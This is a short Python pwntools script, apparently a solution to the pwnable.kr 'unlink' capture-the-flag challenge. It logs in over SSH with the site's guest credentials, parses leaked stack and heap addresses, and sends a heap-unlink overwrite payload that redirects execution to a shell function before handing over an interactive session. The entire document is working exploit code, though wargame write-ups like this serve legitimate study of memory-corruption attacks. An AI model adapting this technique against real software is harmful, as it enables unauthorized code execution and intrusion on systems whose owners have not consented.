from pwn import *

context.log_level = 'debug'
shell = 0x80484eb


def solver():
	s = ssh(user='unlink', host = 'pwnable.kr', port = 2222, password = 'guest')
	fd = s.run('/home/unlink/unlink')
	raw_input()
	
	fd.recvuntil('stack address leak: ')
	stackleak = int(fd.recvline(), 16)
	fd.recvuntil('heap address leak: ')
	heapleak = int(fd.recvline(), 16)

	pay = p32(shell)
	pay += "A" * 12
	pay += p32(heapleak + 0xc)
	pay += p32(stackleak + 0x10)

	fd.sendline(pay)
	fd.interactive()



if __name__ == '__main__':
	solver()
